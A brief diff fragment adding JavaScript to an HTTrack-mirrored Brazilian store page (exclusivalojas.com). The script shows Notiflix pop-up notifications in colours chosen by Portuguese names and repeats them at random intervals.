+            if (color == "azul") {
+                Notiflix.Notify.Info(msg_final, option);
+            }
+ 
+            if (color == "vermelho") {
+                Notiflix.Notify.Failure(msg_final, option);
+            }
+ 
+            if (color == "amarelo") {
+                Notiflix.Notify.Success(msg_final, option);
+            }
+ 
+            var rand = Math.floor(Math.random() * (max_time - min_time + 1) + min_time);
+            setTimeout(show_notification, rand * 1000);
+        }
+            setTimeout(show_notification, 4 * 1000);
+</script></body><!-- Mirrored from exclusivalojas.com/loja/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 15 Oct 2024 14:43:04 GMT --></html>
